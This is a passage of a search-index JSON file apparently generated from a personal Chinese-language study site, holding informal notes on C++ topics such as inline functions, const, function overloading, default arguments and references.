A(){p=0;}//\u81f3\u5c11\u4fdd\u8bc1p\u662f0\uff0c\u8fd9\u6837\u5982\u679c\u5728\u6ca1\u88abnew\u7684\u60c5\u51b5\u4e0b\u4e00\u6837\u53ef\u4ee5\u88abdelete\n    ~A(){if(p) delete p;}//\u6700\u597d\u8fd8\u662f\u52a0\u4e00\u5c42\u4fdd\u9669\n};\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#_4","title":"\u6807\u51c6\u5e93\u51fd\u6570","text":"<p>reverse() \u53ef\u7528\u4e8e\u65cb\u8f6c\u5b57\u7b26\u4e32 reverse(s.begin(),s.end())</p> <p>assert(\u6761\u4ef6)\u8fd9\u4e2a\u6761\u4ef6\u4e3a\u5047\uff0c\u5219\u7a0b\u5e8f\u9000\u51fa\uff1f</p> <p>sort \u6392\u5e8f\u7b97\u6cd5 sort\uff08c.begin(),c.end()\uff09</p> <pre><code>sort(\u8fed\u4ee3\u56681\uff0c\u8fed\u4ee3\u56682,judge function) \u8fd4\u56devoid\nsort(vec.begin(),vec.end(),greater&lt;int&gt;())\n</code></pre> <p>\u200d</p> <p>count_if(\u8fed\u4ee3\u5668\uff0c\u8fed\u4ee3\u5668\uff0c\u6761\u4ef6) predicate\uff0c\u662f\u4e00\u79cd\u5224\u65ad\u5de5\u5177\uff0c\u4f1a\u4f20\u56de\u771f\u6216\u5047</p> <pre><code>count_if(vi.begin(),vi.end(), not1(bind2nd(less&lt;int&gt;(), 40)))\n</code></pre> <p>find \u51fd\u6570</p> <pre><code>find(\u8fed\u4ee3\u56681,\u8fed\u4ee3\u56682,target) //\u8fd4\u56de\u4e00\u4e2a\u8fed\u4ee3\u5668\uff0c\u5efa\u8bae\u662f\u7528auto\u53bb\u63a5\u6536\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#c_1","title":"C++\u7279\u6027","text":""},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#inline-function","title":"inline function","text":"<p>inline function is called function-like macros \u7c7b\u4f3c\u4e8e\u5b8f\u51fd\u6570\u7684\u4e00\u79cd\u51fd\u6570</p> <p>\u53bb\u8c03\u7528\u4e00\u4e2a\u51fd\u6570 \u4e0d\u8bba\u51fd\u6570\u591a\u7b80\u5355 \u90fd\u8981\u8fdb\u884c\u4e00\u7cfb\u5217\u989d\u5916\u7684\u5f00\u9500\u5de5\u4f5c\uff1a\u628a\u53c2\u6570\u538b\u5165 \u628a\u8fd4\u56de\u5730\u5740\u538b\u5165 \u51c6\u5907\u597d\u8fd4\u56de\u503c \u6700\u7ec8\u628a\u538b\u5165\u7684\u51fa\u6808</p> <p>\u4e3a\u6b64\u6211\u4eec\u4f7f\u7528 inline function \u5185\u8054\u51fd\u6570</p> <p>\u4e0d\u662f\u53bb\u8c03\u7528\u51fd\u6570 \u800c\u662f\u76f4\u63a5\u628a\u51fd\u6570\u4ee3\u7801\u5d4c\u5165\u8c03\u7528\u7684\u5730\u65b9\u3002\u5c31\u50cf\u5b8f\u51fd\u6570\u7684\u4f7f\u7528\u65b9\u5f0f\u4e00\u6837</p> <p>\u5bf9\u4e8e\u7c7b\u578b\u68c0\u67e5\u662f\u7f16\u8bd1\u65f6\u505a\u7684 inline \u51fd\u6570\u5904\u7406\u7684\u662f\u8fd0\u884c\u65f6\u7684\u989d\u5916\u5f00\u9500\uff0c\u7c7b\u578b\u68c0\u67e5\u548c\u4e00\u822c\u51fd\u6570\u8fd8\u662f\u4e00\u6837\u7684 \u4f7f\u7528inline\u51fd\u6570\u65f6\u6709\u4ee5\u4e0b\u8981\u6c42</p> <pre><code>//\u5fc5\u987b\u5728\u51fd\u6570\u539f\u578b\u548c\u51fd\u6570\u5b9a\u4e49\u4e2d\u90fd\u52a0\u4e0ainline \u5173\u952e\u5b57\n//.h\u548c.cpp\u4e2d\u90fd\u8981\u52a0inline\ninline int plusone(int x);\ninline int plusone(int x) {return ++x;}\n//inline \u51fd\u6570\u7684\u7279\u6b8a\u6027\u5728\u4e8e \u5176\u672c\u8eab\u770b\u8d77\u6765\u7684\u5b9a\u4e49\u5176\u5b9e\u662f\u4e00\u4e2a\u58f0\u660e \u5982\u7b2c\u56db\u884c\u7684\u8fd9\u4e2a\u5176\u5b9e\u662f\u4e00\u4e2a\u58f0\u660e\n//\u56e0\u6b64\u5728\u591a\u6570\u60c5\u51b5\u4e0b\u4f7f\u7528inline\u65f6 \u76f4\u63a5\u5728.h\u6587\u4ef6\u4e2d\u5199\u5728\u8fd9\u4e2a\u5b8c\u6574\u5f62\u5f0f\u5c31\u597d\n</code></pre> <p>\u76f8\u6bd4\u4e8eC\u8bed\u8a00\u7684\u5b8f\u800c\u8a00 \u5b8f\u51fd\u6570\u4e0d\u80fd\u505a\u7c7b\u578b\u68c0\u67e5 \u800cinline\u51fd\u6570\u53ef\u4ee5\uff0c\u56e0\u6b64inline function\u662f\u5b8f\u7684\u4f18\u79c0\u66ff\u4ee3</p> <p>\u9012\u5f52\u51fd\u6570\u4e0d\u53ef\u4ee5\u505ainline\uff0c\u4ee3\u7801\u91cf\u5f88\u5927\u7684\u51fd\u6570\u4e5f\u4e0d\u503c\u5f97\u505ainline\uff0c\u4ece\u6c47\u7f16\u6307\u4ee4\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u4ee3\u7801\u672c\u8eab\u4e5f\u662f\u4e00\u6761\u6761\u5199\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u8fc7\u4e8e\u5197\u957f\u7684\u4ee3\u7801\u4f1a\u9020\u6210\u5185\u5b58\u7d27\u5f20\u7b49\u4e00\u7cfb\u5217\u95ee\u9898 \u5728\u73b0\u4ee3\u7f16\u8bd1\u5668\u4e2d\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5224\u65ad\u8fd9\u4e2a\u51fd\u6570\u662f\u5426\u503c\u5f97\u505a\u51fainline\uff0c\u4e0d\u518d\u9700\u8981\u6211\u4eec\u53bb\u624b\u52a8\u6dfb\u52a0inline\u5173\u952e\u8bcd\u4e86</p> <p>inline\u51fd\u6570 \u4f5c\u4e3a\u6210\u5458\u51fd\u6570 \u5728\u7c7b\u4e2d\u76f4\u63a5\u5b9a\u4e49\u5199\u51fa\u6765\u7684\u51fd\u6570 \u90fd\u662finline\u51fd\u6570 \u76ee\u524dinline\u5173\u952e\u8bcd\u7684\u5b9e\u9645\u7528\u5904\u5728\u4e8e\u6784\u5efa\u4ec5\u6709.h\u6ca1\u6709.cpp\u7684\u5e93 \u77ed\u5c0f\u7684\u5e76\u4e14\u5728\u5faa\u73af\u4e2d\u53cd\u590d\u591a\u6b21\u8c03\u7528\u7684\u51fd\u6570 \u503c\u5f97\u505a\u51fainline</p> <pre><code>class A{\npublic :\n    void print(){cout&lt;&lt;endl;}//\u8fd9\u4e2a\u51fd\u6570\u9ed8\u8ba4\u4e3ainline\u51fd\u6570 \u52a0\u4e0ainline\u5173\u952e\u8bcd\u4e5f\u4e0d\u4f1a\u9519\n    void change();\nprivate:\n    int i;\n}\ninline void A:: change(){\n    i++;\n}\n\n//\u5728\u58f0\u660e\u4e2d\u5199\u5b9a\u4e49\u7684\u884c\u4e3a\u6709inline\u7684\u5c5e\u6027  class \u672c\u8eab\u53ea\u662f\u4e00\u4e2a\u58f0\u660e \u5982\u679c\u5728\u91cc\u9762\u5199\u4e86\u51fd\u6570\u7684\u5b9a\u4e49 \u5219\u8fd9\u4e2a\u51fd\u6570\u4e3ainline\u51fd\u6570\uff1f\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#const","title":"const *","text":"<ol> <li>const int i=3; \u8fd9\u4e2ai\u4e0d\u80fd\u88ab\u540e\u7eed\u4fee\u6539\uff0c\u5373\u4fbf\u662f\u628a\u5176\u4fee\u6539\u4e3a3\uff0c\u5bf9\u4e8e\u8fd9\u6837\u7684i\uff0c\u5fc5\u987b\u88ab\u521d\u59cb\u5316\uff0c\u6307\u5411\u5176\u7684\u6307\u9488\u4e5f\u5fc5\u987b\u662f\u5e38\u91cf\u6307\u9488\uff0c\u59822\u4e2d\u7684\u4e24\u79cd 3\u4e2d\u4e0d\u884c</li> <li>const int * p=&amp;i;  int const* p=&amp;i;  \u8868\u793a\u6307\u9488\u53ef\u4ee5\u88ab\u4fee\u6539\uff0c\u4f46\u662f\u6307\u9488\u6240\u6307\u5411\u7684\u90a3\u4e2ai\u7684\u5185\u5bb9\u662f\u4e0d\u80fd\u88ab\u4fee\u6539\u7684\u3002\u4ed6\u4eec\u53ef\u4ee5\u6307\u5411\u975econst\u7684i \uff1f\uff1f</li> <li>int * const p=&amp;i;  \u8868\u793ai\u7684\u5185\u5bb9\u53ef\u4ee5\u4fee\u6539\uff0c\u4f46\u662fp\u672c\u8eab\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u4e00\u5b9a\u662f\u6307\u5411i</li> <li>const int * const p=&amp;i;  i\u7684\u5185\u5bb9\u548cp\u7684\u5185\u5bb9\u90fd\u4e0d\u80fd\u4fee\u6539</li> <li>void func(const int *x)   \u5728\u6b64\u51fd\u6570\u4e2d\u4e0d\u4f1a\u5bf9x\u6240\u6307\u5411\u7684\u5bf9\u8c61\u505a\u51fa\u6539\u53d8\uff0c\u66f4\u5e38\u7528void func(const int &amp;x)     \u5728\u6b64\u79cd\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2ax\u53ea\u80fd\u8c03\u7528\u59827\u4e2d\u5b9a\u4e49\u7684\u51fd\u6570</li> <li>const int func(int x) \u53ea\u80fd\u8d4b\u503c\u7ed9const int\u7684\u53d8\u91cf</li> <li>void Class::func(int x) const {...} \u6211\u4eec\u90fd\u77e5\u9053\u7c7b\u7684\u6210\u5458\u51fd\u6570\u6709this\u6307\u9488\u7684\u5b58\u5728\uff0c\u4f46\u662f\u56e0\u4e3athis\u662f\u9690\u5f0f\u5b58\u5728\u7684\uff0c\u56e0\u6b64\u7279\u522b\u7684\u5728\u540e\u9762\u52a0\u4e00\u4e2aconst\uff0c\u8868\u793a\u5bf9this\u8fdb\u884cconst\u7ea6\u675f\uff0c\u8fd9\u4e2aconst\u5728\u5b9a\u4e49\u548c\u58f0\u660e\u7684\u65f6\u5019\u90fd\u9700\u8981\u52a0</li> <li>const \u53bb\u786e\u5b9a\u6570\u7ec4\u7684\u5927\u5c0f\uff0c\u5b83\u5fc5\u987b\u88ab\u521d\u59cb\u5316\uff0c\u5e76\u4e14\u662f\u88ab\u5e38\u91cf\u5982100\u8fd9\u79cd\u521d\u59cb\u5316\u3002</li> <li>\u5b57\u9762\u91cf\u5b57\u7b26\u4e32\u7684const\u5c5e\u6027\uff1f \u53ef\u4ee5\u8d4b\u503c\u7ed9\u975e\u5e38\u91cf\u5b57\u7b26\u6307\u9488\uff0c\u4f46\u662f\u4f1awarning</li> </ol> <p>const \u53d8\u91cf \u4ecd\u7136\u662f\u4e00\u4e2a\u53d8\u91cf \u867d\u7136\u5176\u4e0d\u53d1\u751f\u6539\u53d8 \u4e5f\u4e0e152\u8fd9\u79cd\u5e38\u6570\u5b58\u5728\u672c\u8d28\u533a\u522b</p> <p>const int\u548cint \u4e0d\u662f\u76f8\u540c\u7684\u7c7b\u578b  \u666e\u901aint \u53ef\u4ee5\u4f20\u7ed9const int \u4f46\u662f</p> <pre><code>const int bufsize=1024;\nextern const int bufsize;//\u8fd9\u53e5\u8bdd\u7684\u610f\u601d\u662f\uff0c\u6211\u4eec\u58f0\u660e\u6709\u4e00\u4e2abufsize\u7684\u53d8\u91cf \u7136\u540e\u5b83\u662f\u4e00\u4e2a\u5e38\u91cf \u5373\u7f16\u8bd1\u4e2d\u4f1a\u786e\u4fdd\u5176\u4e0d\u88ab\u6539\u53d8\n                         //\u5bf9\u4e8e\u8fd9\u6837\u4e00\u4e2abufsize\u800c\u8a00 \u53ef\u4ee5\u7528\u5176\u53bb\u4f5c\u4e3a\u6570\u7ec4\u957f\u5ea6\nint a[bufsize];\n//\u4f46\u4e0d\u80fd\u505a\u8fd9\u6837\u7684\u64cd\u4f5c\nint x;\ncin&gt;&gt;x;\nconst int m=x;\nint n[m];\n//\u4e0a\u8ff0\u505a\u6cd5\u662f\u9519\u8bef\u7684 \u5fc5\u987b\u4fdd\u8bc1\u7f16\u8bd1\u7684\u65f6\u5019\u77e5\u9053m\u7684\u503c \u4e00\u822c\u7684const\u7684\u5b9a\u4e49 \u5728\u7f16\u8bd1\u7684\u65f6\u5019\u4f1a\u77e5\u9053\u5176\u503c \u6765\u786e\u5b9a\u540e\u7eed\u6709\u6ca1\u6709\u5bf9\u5176\u505a\u51fa\u6539\u53d8\n</code></pre> <p>\u5bf9\u4e8e\u4e00\u4e2a\u5bf9\u8c61\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u65f6\uff0c\u4e3a\u4e86\u907f\u514d\u5de8\u5927\u7684\u62f7\u8d1d\u5f00\u9500\uff0c\u4e00\u822c\u4f1a\u4f20\u5165\u4e00\u4e2a\u5730\u5740\uff0c\u5f53\u5730\u5740\u4f20\u5165\u65f6\u4f7f\u7528const \u53ef\u4ee5\u907f\u514d\u5bf9\u8c61\u5728\u51fd\u6570\u4e2d\u88ab\u4fee\u6539</p> <p>\u5982\u679c\u6211\u4eec\u5bf9\u4e00\u4e2a\u5bf9\u8c61\u524d\u52a0\u4e0aconst \u5219\u8bf4\u660e\u5bf9\u8c61\u91cc\u9762\u7684\u6570\u636e\u90fd\u4e0d\u80fd\u88ab\u4fee\u6539 \u4f46\u662f\u6211\u4eec\u5bf9\u4e8e\u5176\u4e2d\u51fd\u6570\u9700\u8981\u505a\u4e00\u4e9b\u51c6\u5907 \u5f53\u6211\u4eec\u5728\u51fd\u6570\u540d\u540e\u9762\u52a0\u4e0aconst\u7684\u65f6\u5019 \u5373\u662f\u8bf4\u660e\u8fd9\u4e2a\u51fd\u6570\u4e00\u5b9a\u4e0d\u4f1a\u4fee\u6539\u5bf9\u8c61\u4e2d\u7684\u6570\u636e</p> <pre><code>int Data::expressday(int d) const{\n        cout&lt;&lt;d&lt;&lt;endl;\n        return d; \n}\n//\u8fd9\u4e2a\u51fd\u6570\u4e2d\u4e0d\u4f1a\u4fee\u6539data\u8fd9\u4e2a\u7c7b\u7684\u5bf9\u8c61\u4e2d\u7684\u4efb\u4f55\u6570\u636e\n//\u5728\u539f\u578b\u548c\u5b9a\u4e49\u7684\u65f6\u5019\u90fd\u8981\u52a0\u4e0a\u8fd9\u4e2aconst\nint expressday(int d) const;\n</code></pre> <p>\u9690\u5f0fconst\u7684\u91cd\u8f7d</p> <pre><code>class A{\nprivate :\n    int i;\npublic:\n    A():i(1){}\n    void f() {cout&lt;&lt;\"f\"&lt;&lt;endl;}\n    void f() const {cout&lt;&lt;\"ff\"&lt;&lt;endl;}\n};\n//\u8fd9\u662f\u53ef\u4ee5\u7f16\u8bd1\u901a\u8fc7\u7684\n//\u8fd9\u91cc\u6784\u6210\u4e86\u51fd\u6570\u7684overload\n//\u5b9e\u9645\u4e0a\u5982\u4e0b\nvoid f(A *this);\nvoid f(const A* this);\n//\u7b2c\u4e8c\u4e2af\u4e13\u95e8\u5904\u7406\u90a3\u4e9bconst\u7684A\u7c7b\u5bf9\u8c61\n</code></pre> <p>const \u4fee\u9970\u7684\u6210\u5458\u53d8\u91cf\u5fc5\u987b\u521d\u59cb\u5316</p> <pre><code>//\u5982\u679c\u6709\u4ee5\u4e0b\u60c5\u51b5\u51fa\u73b0\nclass A{\n        const int a;\n};\n//\u8fd9\u4e2aa\u5fc5\u987b\u8981\u88ab\u521d\u59cb\u5316\n</code></pre>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#overload","title":"\u51fd\u6570\u91cd\u8f7d overload","text":"<p>function overloading </p> <p>\u82e5\u4e24\u4e2a\u51fd\u6570\u540d\u79f0\u76f8\u540c \u53c2\u6570\u8868\u4e0d\u540c \u5219\u53ef\u4ee5\u91cd\u540d \u6784\u6210\u91cd\u8f7d\u5173\u7cfb  \u4f46\u662f\u5982\u679c\u53ea\u65f6\u8fd4\u56de\u503c\u4e0d\u540c \u4f46\u662f\u53c2\u6570\u8868\u548c\u51fd\u6570\u540d\u5747\u76f8\u540c \u65e0\u6cd5\u6784\u6210\u51fd\u6570\u91cd\u8f7d \u51fd\u6570\u91cd\u8f7d\u7684\u610f\u4e49\u5728\u4e8e\u7f16\u8bd1\u5668\u901a\u8fc7\u4e0d\u540c\u7684\u53c2\u6570\u8f93\u5165\uff0c\u6765\u51b3\u5b9a\u4f7f\u7528\u54ea\u79cd\u51fd\u6570\u5f62\u5f0f\uff0c\u59a5\u5584\u4f7f\u7528\u53ef\u4ee5\u51cf\u5c11\u5f88\u591a\u5185\u8017</p> <pre><code>//\u57fa\u672c\u6240\u6709\u51fd\u6570\u90fd\u652f\u6301\u91cd\u8f7d\ndouble ads(double);\nint ads(int);\n</code></pre> <p>default arguments \uff08\u7f3a\u7701\u53c2\u6570\u503c\uff09\u4f60\u53ef\u4ee5\u5728\u51fd\u6570\u7684\u53c2\u6570\u8868\u91cc\u9884\u5148\u7ed9\u4e00\u4e2a\u503c \u8fd9\u4e2a\u529f\u80fd\u7684\u4f7f\u7528\u6709\u4ee5\u4e0b\u8981\u6c42 \u539f\u5219\u5728\u4e8e\u5148\u5199\u539f\u578b \u518d\u5199\u5b9a\u4e49\uff0c\u7f3a\u7701\u7684\u53c2\u6570\u503c\u4f7f\u7528\u7684\u539f\u5219\u5728\u4e8e\u4e00\u65e6\u6709\u4e00\u4e2a\u53c2\u6570\u6709\u4e86\u9ed8\u8ba4\u53c2\u6570\u503c\u4e4b\u540e\uff0c\u540e\u9762\u6240\u6709\u7684\u53c2\u6570\u90fd\u5fc5\u987b\u6709\u9ed8\u8ba4\u53c2\u6570\u503c default arguments \u4e0d\u592a\u5b89\u5168\u3002</p> <pre><code>int func(int a,int b,int c=0); //default arguments \u5fc5\u987b\u4ece\u53f3\u8fb9\u5f00\u59cb\u5b58\u5728 \u5982\u679cb\u6709\u9884\u5148\u8d4b\u503c \u5219c\u4e00\u5b9a\u8981\u6709\nx=func(1,2);\ny=func(1,2,3);\n//\u8fd9\u90fd\u662f\u4fdd\u8bc1\u4e86\u51fd\u6570\u5199\u5f62\u53c2\u65f6 \u4e00\u5b9a\u662f\u4ece\u5de6\u5f80\u53f3\u4f20\u5165\u7684\n//default arguments \u53ea\u80fd\u5728.h\u6587\u4ef6\u91cc\u9762\u5199 \u5728.cpp\u6587\u4ef6\u4e2d\u4e0d\u80fd\u5199\n\n.h:\nint dun(int a,int b=0);\n.cpp:\nint dun(int a,int b){\ncout&lt;&lt;a&lt;&lt;b&lt;&lt;endl;\n}\n\n//\u6216\u8005\u5728.cpp\u4e2d\u5148\u58f0\u660e\u539f\u578b \u518d\u5199\u5b9a\u4e49 default arguments \u662f\u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u64cd\u4f5c\u7684\n.cpp:\nint dun(int a,int b=0);\nint dun(int a,int b){\ncout&lt;&lt;a&lt;&lt;b&lt;&lt;endl;\n}\n</code></pre> <p>\u7f16\u8bd1\u5668\u5904\u7406\u51fd\u6570\u91cd\u8f7d\u7684\u8fc7\u7a0b\u53eb\u505a\u91cd\u8f7d\u89e3\u6790overload resolution \u7f16\u8bd1\u5668\u4f1a\u6536\u96c6\u540c\u4e00\u4e2a\u540d\u5b57\u7684\u51fd\u6570\u5f62\u6210\u53ef\u9009\u51fd\u6570\u96c6\uff0c\u7136\u540e\u6309\u7167\u4e00\u5b9a\u89c4\u5219\u6bd4\u8f83\u8fd9\u4e9b\u51fd\u6570\uff0c\u5f53\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\u65f6\u6709\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u4f18\u4e8e\u5176\u4ed6\u6240\u6709\u51fd\u6570\u7684\u65f6\u5019\uff0c\u8c03\u7528\u6210\u529f\uff1b\u53cd\u4e4b\u5219\u5931\u8d25</p> <pre><code>void f(long);\nvoid f(float);\nf(1.0);//\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898 \u56e0\u4e3a\u6b64\u65f6float\u662f\u6700\u4f73\u9009\u62e9\nf(1);//\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c0\u4f5c\u4e3aint\u53ef\u4ee5\u8f6c\u6362\u4e3along\u4e5f\u53ef\u4ee5\u8f6c\u6362\u4e3afloat\uff0c\u6240\u4ee5\u4e24\u8005\u90fd\u4e0d\u662f\u6700\u4f73\u9009\u62e9\uff0c\u56e0\u6b64\u91cd\u8f7d\u9009\u62e9\u5931\u8d25\n\nvoid ff(int i=1);\nvoid f();\nf(1)//\u4e0d\u4f1a\u51fa\u73b0\u95ee\u9898\nf()//\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u4e0d\u77e5\u9053\u6307\u5411\u54ea\u4e2a\n</code></pre> <p>\u5728\u7406\u8bba\u4e0a\u51fd\u6570\u91cd\u8f7d\u53ef\u4ee5\u8986\u76d6\u6240\u6709\u7684\u9ed8\u8ba4\u53c2\u6570\u7684\u60c5\u51b5\uff0c\u6709\u4e86\u51fd\u6570\u91cd\u8f7d\u8fd9\u4e2a\u7279\u6027\u5b9e\u9645\u4e0a\u5e76\u4e0d\u9700\u8981\u9ed8\u8ba4\u53c2\u6570\u8fd9\u4e2a\u7279\u6027 \u4f46\u662f\u56e0\u4e3a\u9ed8\u8ba4\u53c2\u6570\u51fa\u73b0\u5728\u524d\uff0c\u4e3a\u4e86\u517c\u5bb9\u4ee5\u524d\u7684\u4ee3\u7801\uff0cc++\u4ecd\u7136\u4fdd\u7559\u4e86\u9ed8\u8ba4\u53c2\u6570\u7684\u7279\u6027\u3002</p>"},{"location":"%E6%8A%80%E6%9C%AF%E7%A7%AF%E7%B4%AF/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/C%2B%2B%20note.md/C%2B%2B%20note/#reference","title":"reference \u5f15\u7528 *","text":"<p>\u5f15\u7528\u5fc5\u987b\u88ab\u521d\u59cb\u5316</p> <pre><code>char c;\nchar &amp;r=c;//\u8fd9\u4e2ap\u5c31\u662f\u5bf9c\u7684\u5f15\u7528 \u8bb0\u8fd9\u4e2ap\u4e3ac\u7684refname \u522b\u540d\n</code></pre> <p>\u5bf9p\u7684\u64cd\u4f5c\u5c31\u662f\u5bf9c\u64cd\u4f5c \u7b49\u53f7\u53f3\u8fb9\u5c31\u662f\u4e00\u4e2a\u53d8\u91cf \u5c31\u4ece\u7b80\u5355\u6765\u8bf4 r\u5c31\u76f8\u5f53\u4e8ec\u7684\u4e00\u4e2a\u522b\u540d \u5bf9r\u64cd\u4f5c\u5c31\u662f\u5bf9c\u64cd\u4f5c</p> <p>No pointers to reference, we have reference to pointer  \u79bb\u53d8\u91cf\u8fd1\u7684\u786e\u5b9a\u662f\u6307\u9488\u8fd8\u662f\u5f15\u7528</p> <pre><code>int &amp;*p; //error\nint *&amp;p; //right\n</code></pre> <p>const reference\uff0c\u7c7b\u540cconst\u6307\u9488\uff0c\u4f46\u4e0d\u5b58\u5728\u7b2c\u4e8c\u79cd\u5f62\u5f0f</p> <pre><code>const int&amp; z=x;//\u901a\u8fc7z\u4e0d\u80fd\u6539\u53d8x \u4f46\u662fx\u53ef\u4ee5\u81ea\u884c\u6539\u53d8\n\nint x=10;\nconst int&amp; y=x;\ny++;//\u8fd9\u91cc\u5c31\u4f1a\u62a5\u9519\n\nint &amp; const z=x;//\u4e0d\u5b58\u5728\u8fd9\u79cd\u64cd\u4f5c\n</code></pre> <p>\u5728\u540c\u4e00\u4e2a\u4ee3\u7801\u5757\u4e2d\u7ed9\u4e00\u4e2a\u522b\u540d\u4e00\u822c\u6ca1\u4ec0\u4e48\u610f\u4e49\uff0c\u56e0\u6b64\u5f15\u7528\u6700\u5e38\u7528\u7684\u5730\u65b9\u5c31\u5728\u4e8e\u51fd\u6570\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c</p> <p>\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570</p> <pre><code>void f(int &amp;x);      //\u6548\u679c\u6709\u4e8c\uff1a\u4f20\u53c2\u6548\u7387\u589e\u52a0\u4e86\uff0c\u51fd\u6570\u4e2d\u5bf9x\u7684\u6539\u53d8\u4f1a\u5f71\u54cd\u5230\u5b9e\u53c2\nvoid f(const int &amp;x) //\u53ea\u6709\u6548\u679c\u4e00\n</code></pre> <p>\u5b58\u5728\u7684\u95ee\u9898</p> <pre><code>void f(int &amp;x);\n//\u4ee5\u4e0b\u7684\u51fd\u6570\u8c03\u7528\u4f1a\u51fa\u73b0\u95ee\u9898\nf(2);\nf(x*2);\n//\u82e5\u5199\u6210const \u4e0a\u8ff0\u90fd\u80fd\u6210\u7acb\nvoid f(const int &amp;x);\n</code></pre> <p>\u4f5c\u4e3a\u51fd\u6570\u7684\u8fd4\u56de\u503c</p> <pre><code>double myarray[14];\ndouble &amp;change(int k){\n return myarray[k];\n}\nint main(){\n    double x=change(12);//x\u8d4b\u503c\u4e3amyarray[12]\u7684\u503c\n    change(11)=12;//\u5c06myarray[11]\u8d4b\u503c\u4e3a12 \u5982\u679c\u8fd4\u56de\u503c\u4e3aconst double &amp; \u6b64\u5904\u4fbf\u4e0d\u80fd\u505a\u5982\u6b64\u4fee\u6539\n}\n</code></pre> <p>\u5bf9\u4e8e\u4e0a\u8ff0\u4ee3\u7801\u800c\u8a00\uff0c\u8be5change\u51fd\u6570\u6709\u4e09\u79cd\u8fd4\u56de\u503c</p> <ol> <li>double \uff0c\u90a3\u4e48\u8be5\u8fd4\u56de\u503c\u5c31\u4e0d\u80fd\u505a\u5de6\u503c change(11)=12\u4f1a\u62a5\u9519</li> <li>double &amp;\uff0c\u53ef\u4ee5\u4f5c\u5de6\u503c\uff0c\u53ef\u4ee5\u88ab\u4fee\u6539\uff0cchange(11)=12\u76f8\u5f53\u4e8e\u4fee\u6539\u4e86\u8be5array\u4e2d\u7b2c11\u4f4d\u7684\u6570\u636e</li> <li>const double &amp;, \u7406\u8bba\u4e0a\u53ef\u4ee5\u505a\u5de6\u503c\uff0c\u4f46\u4e0d\u80fd\u88ab\u4fee\u6539\uff0cchange(11)=12\u4f1a\u62a5\u9519\uff0c\u5f53\u8fd4\u56de\u5bf9\u8c61\u6bd4\u8f83\u5927\uff0c\u4f46\u662f\u53c8\u4e0d\u5e0c\u671b\u5b83\u505a\u5de6\u503c\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u91c7\u7528\u8fd9\u79cd\u505a\u6cd5</li> </ol> <p>c++\u4e2d\u6700\u4e3a\u5e38\u7528\u7684\u5bf9\u8c61\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u7684\u65b9\u6cd5</p> <pre><code>void func(const string &amp; name);\n//\u4f20\u5165\u4e00\u4e2astring\u7c7b\u7684\u5bf9\u8c61 \u5e76\u4e14\u662f\u5f15\u7528\u7684\u65b9\u5f0f\u6240\u4ee5\u4e0d\u4f1a\u6709\u5f88\u5927\u7684\u51fd\u6570\u8c03\u7528\u6d88\u8017\n//\u7528\u4e86const\u7684\u5173\u952e\u5b57\u4fdd\u8bc1\u4e86\u5728\u51fd\u6570\u5185\u90e8\u4e0d\u4f1a\u6539\u53d8\u5bf9\u8c61\u91cc\u9762\u7684\u5185\u5bb9\n</code></pre> <p>\u5f53\u5bf9\u8c61\uff08\u975e\u5f15\u7528\uff0c\u975e\u6307\u9488\uff09\u4f5c\u4e3a\u51fd\u6570\u7684\u8fd4\u56de\u503c</p> <pre><code>class A;\nA func(){\n    A a;\n    return a;\n}\n int main(){\n    func().test();//\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u8c03\u7528\u7c7b\u91cc\u7684\u51fd\u6570\n    //\u4f46\u662f\u8981\u6ce8\u610f\u6bcf\u4e00\u4e2afunc\uff08\uff09\u8fd4\u56de\u7684\u90fd\u662f\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\n}\n</code></pre> <p>\u5f15\u7528\u7684\u91cd\u8f7d\u89e3\u6790</p> <pre><code>void func(int x);\nvoid func(int &amp;x);\nvoid func(const int &amp;x);\n//\u5bf9\u4e8e\u8fd9\u4e09\u4e2a\u91cd\u8f7d\u51fd\u6570\uff0c\u6709\u4ee5\u4e0b\u4e09\u4e2a\u53c2\u6570\nfunc(1);//               \u7b2c\u4e00\u79cd\u548c\u7b2c\u4e09\u79cd\u4e3a\u7b2c\u4e00\u4f18\u5148\u7ea7 \nfunc(x);//int x=1;       \u8fd9\u4e09\u79cd\u4f18\u5148\u7ea7\u76f8\u540c\nfunc(r);//const int r=1; \u7b2c\u4e00\u79cd\u548c\u7b2c\u4e09\u79cd\u4e3a\u7b2c\u4e00\u4f18\u5148\u7ea7\n</code></pre> 